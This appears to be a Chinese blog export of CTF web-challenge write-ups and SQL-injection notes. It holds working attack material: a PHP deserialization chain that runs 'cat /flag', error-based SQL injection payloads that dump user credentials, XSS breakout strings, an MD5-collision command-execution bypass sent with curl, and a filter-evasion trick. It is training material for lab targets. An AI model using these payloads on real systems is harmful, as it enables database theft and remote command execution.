&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);</span><br></pre></td></tr></table></figure><h2 id="19-第十九章-星穹真相·补天归源"><a href="#19-第十九章-星穹真相·补天归源" class="headerlink" title="19 第十九章 星穹真相·补天归源"></a>19 第十九章 星穹真相·补天归源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name-&gt;$id($age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __Check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $name($age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line">class PersonC &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pc = new PersonC();</span><br><span class="line">$pc-&gt;name = &#x27;system&#x27;;</span><br><span class="line">$pc-&gt;age = &quot;&quot;;</span><br><span class="line">$pa = new PersonA();</span><br><span class="line">$pa-&gt;name = $pc;</span><br><span class="line">$pa-&gt;id = &#x27;__Check&#x27;;</span><br><span class="line">$pa-&gt;age = &#x27;cat /flag&#x27;;</span><br><span class="line">echo urlencode(serialize($pa));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="sqli-5题解"><a href="#sqli-5题解" class="headerlink" title="sqli-5题解"></a>sqli-5题解</h2><p>对于怎样输入都没有回显位的题目，考虑[报错注入]，这样我们就可以通过报错和获取信息</p><p>1.判断有无注入点 </p><p>?id&#x3D;1 ?id&#x3D;1’ ，两个页面返回不一样，说明没有过滤<code>&#39;</code>,存在注入点</p><p>2.判断注入类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//判断字符型</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">//判断数字型      </span><br><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure><p>3.判断有几个字段</p><p>（为什么要判断，因为要让数据库允许你插入，就要让你自己的select列数&#x3D;原始后台select列数</p><p>像这样：</p><p>【原始查询】     SELECT a, b, c FROM xxx<br>【你注入的查询】 UNION SELECT x, y, z）</p><p>?id&#x3D;1’ order by 3–+</p><p>?id&#x3D;1’ order by 4–+</p><p>4.确定回显位</p><p>?id&#x3D;-1’ union select 1,2,3–+</p><p>发现没有报错，也没回显，用报错注入</p><p>5.报表名(必须写0x7e，~在语法里面是另外一种意思)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;</span><br></pre></td></tr></table></figure><p>6.报列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e))--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure><p>7.报具体数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username,&#x27;~&#x27;,password) from users</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e))--+</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: <span class="string">&#x27;~Dumb~Dumb,Angelina~I-kill-you,D&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="第二章-web进阶-XSS闯关-1"><a href="#第二章-web进阶-XSS闯关-1" class="headerlink" title="[第二章 web进阶]XSS闯关 1"></a>[第二章 web进阶]XSS闯关 1</h2><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h3><p><a href="http://feeb9918-1100-446f-bc56-9c005eeb90ab.node5.buuoj.cn:81/level1?username=xss">http://feeb9918-1100-446f-bc56-9c005eeb90ab.node5.buuoj.cn:81/level1?username=xss</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h3><p>发现输入后没有回显，现在开始代审吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;root&quot; class=&quot;app-wrapper amis-scope&quot;&gt;&lt;div class=&quot;amis-routes-wrapper&quot;&gt;&lt;div class=&quot;a-Toast-wrap a-Toast-wrap--topRight&quot;&gt;&lt;/div&gt;&lt;div class=&quot;a-Page&quot;&gt;&lt;div class=&quot;a-Page-content&quot;&gt;&lt;div class=&quot;a-Page-main&quot;&gt;&lt;div class=&quot;a-Page-header&quot;&gt;&lt;h2 class=&quot;a-Page-title&quot;&gt;&lt;span class=&quot;a-TplField&quot;&gt;XSS test platform&lt;/span&gt;&lt;/h2&gt;&lt;/div&gt;&lt;div class=&quot;a-Page-body&quot;&gt;&lt;span class=&quot;a-TplField&quot;&gt;</span><br><span class="line">    &lt;div id=&quot;ccc&quot;&gt;</span><br><span class="line">                     //这里很重要，有东西等会会被放进来</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    if(location.search == &quot;&quot;)&#123;</span><br><span class="line">    location.search = &quot;?username=xss&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    var username = &#x27;xss&#x27;;</span><br><span class="line">    document.getElementById(&#x27;ccc&#x27;).innerHTML= &quot;Welcome &quot; + escape(username);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>1.<code>escape()</code>：<strong>只转义「特殊字符」，普通字母 &#x2F; 数字不处理</strong></p><ul><li><p>若<code>username</code>是<code>&lt;script&gt;</code>，<code>escape()</code>会转成：<code>%3Cscript%3E</code>；</p></li><li><p>转义后的字符串通过<code>innerHTML</code>渲染时，会被当成 “普通文本” 而非 “HTML&#x2F;JS 代码”，无法执行恶意脚本。</p></li><li><p>3.<code>document.getElementById(&#39;xxx&#39;)</code> 作用是：</p><p><strong>在整个页面中，找到唯一的、<code>id</code> 属性等于 <code>xxx</code> 的 HTML 元素</strong>。</p></li></ul><ol start="2"><li><code>innerHTML</code>：JS 给 DOM 元素 “塞内容” 的方式，但它有个 “危险特性”：<strong>会把字符串当成 HTML 代码解析，而不是纯文本</strong>。</li></ol><p>​            &#96;<div id="ccc">Welcome username</div></p><p>3.<code>document.getElementById(&#39;xxx&#39;)</code> 作用是：</p><p><strong>在整个页面中，找到唯一的、<code>id</code> 属性等于 <code>xxx</code> 的 HTML 元素</strong>。</p><p>所以我们只要在var username &#x3D; ‘xss’;这句话里面插入payload就行，</p><p>因为执行顺序：后端js拿到username数据，放进去，再把代码返回给前端</p><p>​    前端拿到代码后，一句一句执行，我们在var username &#x3D; ‘xss’;这句话中就弹窗，就不用管后面的<code>document.getElementById(&#39;ccc&#39;).innerHTML= &quot;Welcome &quot; + escape(username);</code>这句话了</p><p>输入 username&#x3D;1’;alert(‘1’);&#x2F;&#x2F;</p><p>拼接后变成：var username &#x3D; ‘1’;      alert(1);      &#x2F;&#x2F;</p><h2 id="11-第十一章-千机变·破妄之眼"><a href="#11-第十一章-千机变·破妄之眼" class="headerlink" title="11 第十一章 千机变·破妄之眼"></a>11 第十一章 千机变·破妄之眼</h2><p>省流：HDdss看到了 <strong>GET</strong>  参数名由<code>m,n,o,p,q</code>这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道<strong>参数名等于参数值</strong>才能进入。</p><p>import itertools<br>import requests</p><p>for p in itertools.permutations(“mnopq”):<br>    k &#x3D; “”.join(p)<br>    r &#x3D; requests.get(“<a href="http://127.0.0.1:48386/">http://127.0.0.1:48386/</a>“, params&#x3D;{k: k})<br>    if “flag” in r.text:<br>        print(k)<br>        print(r.text)<br>        break</p><p><img src="/images/image-20251218152437400.png" alt="image-20251218152437400"></p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><p>整个网页就个图片，但是我们发现url有点东西</p><p><img src="/images/image-20260122202902191.png" alt="image-20260122202902191"></p><p>img后面跟着乱七八糟的东西，还有一个cmd，那我们就很想利用一下了</p><p>直接试了ls，cat发现都被过滤了；而且还发现一直有个提示：md5 is fun</p><p><img src="/images/image-20260122203011054.png" alt="image-20260122203011054"></p><p>看了一下源代码，发现有个base64</p><p>于是我把url上面奇怪的字符串用base转了两下，得到16进制，16进制再转utf-8，得到 图片名字 555.png</p><h3 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="C:\Users\21709\Pictures\Screenshots\屏幕截图 2026-01-22 194211.png" alt="屏幕截图 2026-01-22 194211" style="zoom: 50%;" /></h3><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260122194100421.png" alt="image-20260122194100421" style="zoom: 67%;" /><p>因为在cmd无值的情况下我们仍然在返回页面看到了png，所以先不管cmd；</p><p>或许我们是否可以在img传入我们想要看到的文件，</p><p>比如源码index.php，但是这里需要刚刚相反的进制转换：</p><p>hex*4-&gt;</p><p>696e6465782e706870</p><p>base64*2-&gt;-&gt;</p><p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>得到一堆base64，转码得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);//错误被隐藏，后续img和cmd不传参导致的错误不再显示</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>小知识点：</p><p><strong><code>E_ALL || ~ E_NOTICE</code></strong>。</p><ul><li><strong><code>~ E_NOTICE</code></strong>： <code>~</code> 是按位取反运算符。在二进制层面，<code>E_NOTICE</code> 的位被置 0，其余位全部置 1。</li><li><strong><code>||</code></strong>： 这是<strong>逻辑或</strong>（Logical OR），不是位或（Bitwise OR <code>|</code>）。 在 PHP 中，<code>E_ALL</code> 是一个非零整数（True），<code>~ E_NOTICE</code> 也是一个非零整数（True）。 <strong><code>True || True</code> 的结果永远是布尔值 <code>1</code>。</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点：</p><p>post传参a，b，MD5强比较绕过</p><p>1.string会强制转换，所以不能传入数组，因为被转换后变成array，值就相等了；</p><p>2.!&#x3D;&#x3D;：值不一样 || 类型不一样 （二选一满足即可）</p><p>3.&#x3D;&#x3D;&#x3D;值和类型都一样</p><p>传入a和b满足值不一样，但是md5过后的值和类型都要一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>考虑过滤，用dir代替ls</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X -POST &quot;http://e220bba8-1583-48f3-aa75-54e78da3e6f1.node5.buuoj.cn:81/index.php?img=&amp;cmd=dir+/&quot; -d &quot;a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20260122202647944.png" alt="image-20260122202647944"></p><p>看到flag，考虑绕过，用ca\t flag</p><p><img src="/images/image-20260122202713163.png" alt="image-20260122202713163"></p>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-未整理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql_notes</title>
      <link href="/posts/392ab792.html"/>
      <url>/posts/392ab792.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-双写select"><a href="#1-双写select" class="headerlink" title="1.双写select"></a>1.双写select</h3><h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h3><p>floor 向下取整</p><p>rand():0-1</p><p>floor(rand()*2):0,1,1循环</p><p>3 种核心方法：<code>floor</code>、<code>extractvalue</code>、<code>updatexml</code>——<strong>报错注入就是 “故意让数据库报错，从错误信息里偷数据”</strong></p><h6 id="先统一前提（CTF-里常用）"><a href="#先统一前提（CTF-里常用）" class="headerlink" title="先统一前提（CTF 里常用）"></a>先统一前提（CTF 里常用）</h6><p>假设是单引号字符型注入（比如 Less-1），注入点是<code>?id=1&#39;</code>，我们要偷的是 “当前数据库名”（用<code>database()</code>函数获取）。</p><h4 id="1-floor-报错注入（最经典：临时表撞车）"><a href="#1-floor-报错注入（最经典：临时表撞车）" class="headerlink" title="1. floor 报错注入（最经典：临时表撞车）"></a>1. floor 报错注入（最经典：临时表撞车）</h4><p><strong>核心逻辑</strong>：(MySQL 在 <code>GROUP BY</code> 时，如果产生了“同一组的键不同但随机重复”，就会报错)</p><p>​用<code>group by</code>建临时表，配合<code>floor(rand(0)*2)</code>生成重复数据，导致 “主键冲突” 报错。</p><p>1.1 主键： <code>concat(数据库名, floor(rand(0)*2))</code>的结果，比如<code>security1</code></p><p>​  concat(database(),0x7e,floor(rand(0)*2)) -&gt; security~1</p><p>提示： x会多算一次：（因为外面groupby算一次，里面as x也算一次），所以第一次处理从0变1，第二次处理到1了，但由于主键重复出错了所以就不用再算下去了</p><p>​       </p><p>1.2 <code>group by x</code>：分组不是我们的目的，逼它临时建表才是我们目标</p><p>​    <code>select 1 from (...)</code>： 这行是 “随便查个值凑数”—— 我们的目标不是查<code>1</code>，而是让里面的子查询执行（从而触发报错）。</p><p>​因为外层需要一个合法的查询语句，所以随便选个<code>1</code>（也可以选<code>2</code>、<code>3</code>），只要能让子查询跑起来就行。</p><p>​    <code>and (...)--+</code>：让前面的语句合法，让后面的语句闭嘴（SQL 里<code>and</code>两边都要是布尔值）</p><p>​    <code>information_schema.tables</code>是 MySQL 自带的表，里面存着所有数据库的表信息，数据量足够大（至少有几十行）。</p><pre><code>我们需要这么多数据，是为了让`group by x`能多次计算`x`的值，才有机会生成重复的`x`（比如`security~1`），触发主键冲突报错。如果选数据少的表（比如只有 1 行），`group by x`只算一次`x`，就没法重复了。</code></pre><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 内层子查询（当临时表）：统计count(*)并拼接x</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(database(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> x </span><br><span class="line"><span class="keyword">from</span> information_schema.tables </span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> x;  </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 外层查询：从这个临时表查数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (上面的子查询) <span class="keyword">as</span> a;</span><br></pre></td></tr></table></figure><p>内层子查询会先执行，生成一个包含<code>count(*)</code>和<code>x</code>的临时表，外层查询再从这个临时表里查<code>1</code>（只是为了让子查询执行）</p><p>​     子查询:必须用括号<code>()</code>包起来；先执行内层子查询，再执行外层查询；</p><pre><code>  x从子查询结果里查数据时，必须给子查询起别名.</code></pre><ul><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat(database(),0x7e,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</span><br></pre></td></tr></table></figure></li><li><p>报错效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &#x27;security~1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-extractvalue-报错注入（XML-函数：非法路径）"><a href="#2-extractvalue-报错注入（XML-函数：非法路径）" class="headerlink" title="2. extractvalue 报错注入（XML 函数：非法路径）"></a>2. extractvalue 报错注入（XML 函数：非法路径）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(xml_target, xpath_expression)</span><br></pre></td></tr></table></figure><p>xml_target随便填</p><p>xpath_expression填执行语句</p><ul><li><p><strong>核心逻辑</strong>：<code>extractvalue</code>本是 MySQL 解析 XML 的函数，要求第<code>二</code>个参数必须是 “合法 XML 路径”（比如<code>/bookstore/book</code>）；我们故意传 “数据库名 + 非法格式”，它会报错说 “路径不对”，顺带泄露数据。</p></li><li><p>实战语句</p></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,database(),0x7e))--+</span><br></pre></td></tr></table></figure></li><li><p>报错效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: 